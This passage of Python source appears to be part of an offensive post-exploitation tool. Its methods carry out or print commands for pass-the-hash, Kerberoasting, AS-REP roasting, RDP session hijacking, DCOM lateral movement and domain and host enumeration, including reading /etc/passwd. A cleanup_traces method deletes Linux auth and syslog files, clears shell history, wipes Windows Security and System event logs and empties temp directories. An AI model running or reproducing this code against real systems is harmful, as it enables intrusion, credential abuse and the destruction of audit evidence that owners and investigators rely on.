            result += "\nntlmrelayx.py -tf targets.txt -smb2support"
            result += "\npsexec.py -hashes aad3b435b51404eeaad3b435b51404ee:HASH DOMAIN/user@TARGET"
            result += "\nwmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:HASH DOMAIN/user@TARGET"
            result += "\nsmbexec.py -hashes :HASH DOMAIN/user@TARGET"
            return result
        except Exception as e:
            return f"Error testing Pass-the-Hash: {str(e)}"

    def lateral_kerberoasting(self, target="localhost"):
        self.log(f"[Lateral] Testing Kerberoasting on {target}", "info")
        try:
            kerberoast = self.run_command(
                "impacket-GetUserSPNs DOMAIN/user:password -request 2>/dev/null"
            )
            asrep = self.run_command(
                "impacket-GetNPUsers DOMAIN/user:password -dc-ip DC_IP -request 2>/dev/null"
            )
            result = f"Kerberoasting:\n{kerberoast}\n\nAS-REP Roasting:\n{asrep}"
            result += "\n\nKerberoasting Commands:"
            result += "\nimpacket-GetUserSPNs DOMAIN/user:password -request -outputfile hashes.txt"
            result += "\nimpacket-GetNPUsers DOMAIN/ -usersfile users.txt -request -outputfile asrep.txt"
            result += "\nRubeus.exe kerberoast /outfile:hashes.txt"
            return result
        except Exception as e:
            return f"Error testing Kerberoasting: {str(e)}"

    def lateral_domain_enumeration(self, target="localhost"):
        self.log(f"[Lateral] Enumerating domain from {target}", "info")
        try:
            domain = self.run_command("net config workstation 2>/dev/null")
            dc = self.run_command("nltest /dsgetdc:DOMAIN 2>/dev/null")
            users = self.run_command("net user /domain 2>/dev/null")
            groups = self.run_command("net group /domain 2>/dev/null")
            result = f"Domain Info:\n{domain}\n\nDomain Controller:\n{dc}\n"
            result += f"Domain Users:\n{users}\n\nDomain Groups:\n{groups}"
            return result
        except Exception as e:
            return f"Error enumerating domain: {str(e)}"

    def lateral_rdp_hijack(self, target="localhost"):
        self.log(f"[Lateral] Checking RDP hijack opportunities on {target}", "info")
        try:
            rdp_sessions = self.run_command("query session 2>/dev/null")
            rdp_users = self.run_command("query user 2>/dev/null")
            rdp_port = self.run_command(
                'reg query "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server" /v fDenyTSConnections 2>/dev/null'
            )
            result = f"RDP Sessions:\n{rdp_sessions}\n\nRDP Users:\n{rdp_users}\n"
            result += f"\nRDP Enabled:\n{rdp_port}"
            result += "\n\nRDP Hijack Commands:"
            result += "\ntasklist /FI \"IMAGENAME eq svchost.exe\" /V"
            result += "\nquery session"
            result += "\nrdpcheck.exe TARGET"
            result += "\nInvoke-RDPHijack -SessionID 1"
            return result
        except Exception as e:
            return f"Error checking RDP hijack: {str(e)}"

    def lateral_dcom_execution(self, target="localhost"):
        self.log(f"[Lateral] Testing DCOM lateral movement to {target}", "info")
        try:
            dcom_check = self.run_command("powershell -Command 'Get-ChildItem -Path HKLM:\\SOFTWARE\\Classes -Recurse | Where-Object {$_.Name -match \"DCOM\"}' 2>/dev/null")
            mmc = self.run_command("which dcomexec.py 2>/dev/null")
            result = f"DCOM Objects:\n{dcom_check}\n\nDCOM Tools:\n{mmc}\n"
            result += "\nDCOM Lateral Movement:"
            result += "\ndcomexec.py DOMAIN/user:password@TARGET cmd.exe"
            result += "\nInvoke-DCOM -ComputerName TARGET -Method MMC20.Application"
            result += "\nMethods: MMC20.Application, ShellWindows, ShellBrowserWindow"
            return result
        except Exception as e:
            return f"Error testing DCOM: {str(e)}"

    # ═══════════════════════════════════════════════════════════
    # UTILITY METHODS
    # ═══════════════════════════════════════════════════════════

    def get_system_info(self, target="localhost"):
        self.log(f"[Info] Gathering system information from {target}", "info")
        try:
            os_name = platform.system()
            hostname = self.run_command("hostname")
            ip = self.run_command("hostname -I 2>/dev/null || ip addr show 2>/dev/null | grep 'inet ' | awk '{print $2}'")
            users = self.run_command("whoami && id 2>/dev/null")
            result = f"OS: {os_name}\nHostname: {hostname}\nIP: {ip}\nUser: {users}"
            return result
        except Exception as e:
            return f"Error gathering system info: {str(e)}"

    def cleanup_traces(self, target="localhost"):
        self.log(f"[Cleanup] Clearing traces on {target}", "info")
        try:
            logs = self.run_command("rm -f /var/log/auth.log /var/log/syslog /var/log/messages 2>/dev/null")
            bash_history = self.run_command("rm -f ~/.bash_history && history -c 2>/dev/null")
            windows_logs = self.run_command('wevtutil cl Security 2>/dev/null && wevtutil cl System 2>/dev/null')
            temp = self.run_command("rm -rf /tmp/* /var/tmp/* 2>/dev/null")
            result = f"Linux logs cleared: {logs}\nBash history cleared: {bash_history}\n"
            result += f"Windows logs cleared: {windows_logs}\nTemp cleared: {temp}"
            return result
        except Exception as e:
            return f"Error cleaning traces: {str(e)}"

    def full_enumeration(self, target="localhost"):
        self.log(f"[Enum] Running full enumeration on {target}", "info")
        try:
            results = {
                "system": self.run_command("uname -a 2>/dev/null || systeminfo 2>/dev/null"),
                "network": self.run_command("ip addr show 2>/dev/null || ipconfig /all 2>/dev/null"),
                "processes": self.run_command("ps aux 2>/dev/null || tasklist 2>/dev/null"),
                "users": self.run_command("cat /etc/passwd 2>/dev/null || net user 2>/dev/null"),
                "cron": self.run_command("crontab -l 2>/dev/null && ls /etc/cron* 2>/dev/null"),
                "connections": self.run_command("netstat -tlnp 2>/dev/null || netstat -an 2>/dev/null"),
            }
            output = ""
            for key, value in results.items():
                output += f"\n{'='*50}\n{key.upper()}:\n{'='*50}\n{value}\n"
            return output
        except Exception as e:
            return f"Error in full enumeration: {str(e)}"
